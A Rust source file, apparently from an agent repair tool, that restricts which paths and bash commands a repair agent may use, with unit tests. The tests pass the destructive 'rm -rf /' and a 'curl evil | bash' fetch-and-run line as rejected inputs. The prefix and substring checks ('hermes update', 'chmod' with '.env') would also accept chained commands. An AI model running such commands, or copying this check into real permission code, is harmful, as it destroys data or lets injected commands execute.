use std::path::{Path, PathBuf};

use crate::lifecycle::hermes::{hermes_install_shell_command, hermes_update_shell_command};
use crate::runtime::adapter_by_id;

/// Paths the repair agent may read or edit for a runtime.
pub fn allowed_paths_for_runtime(runtime_id: &str) -> Vec<PathBuf> {
    let mut paths = adapter_by_id(runtime_id)
        .map(|adapter| adapter.config_paths())
        .unwrap_or_default();

    if let Some(config_dir) = dirs::config_dir() {
        paths.push(config_dir.join("agent-doctor").join("guides"));
    }

    paths.sort();
    paths.dedup();
    paths
}

pub fn path_is_allowed(path: &Path, allowed_roots: &[PathBuf]) -> bool {
    let Ok(canonical) = path.canonicalize() else {
        return allowed_roots.iter().any(|root| path.starts_with(root));
    };
    allowed_roots.iter().any(|root| {
        root.canonicalize()
            .map(|root_canonical| canonical.starts_with(&root_canonical))
            .unwrap_or_else(|_| canonical.starts_with(root))
    })
}

/// Conservative bash allowlist — known repair commands only, not arbitrary shell.
pub fn bash_command_allowed(command: &str) -> bool {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return false;
    }

    let hermes_install = hermes_install_shell_command();
    let hermes_update = hermes_update_shell_command();
    if trimmed == hermes_install || trimmed == hermes_update {
        return true;
    }

    if trimmed.starts_with("hermes ") {
        let sub = trimmed.trim_start_matches("hermes ").trim();
        return sub.starts_with("update")
            || sub.starts_with("--version")
            || sub.starts_with("-V")
            || sub.starts_with("version");
    }

    if trimmed.starts_with("chmod ") && trimmed.contains(".env") {
        return true;
    }

    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn allows_hermes_lifecycle_commands() {
        assert!(bash_command_allowed(&hermes_install_shell_command()));
        assert!(bash_command_allowed("hermes --version"));
    }

    #[test]
    fn rejects_arbitrary_shell() {
        assert!(!bash_command_allowed("rm -rf /"));
        assert!(!bash_command_allowed("curl evil | bash"));
    }
}
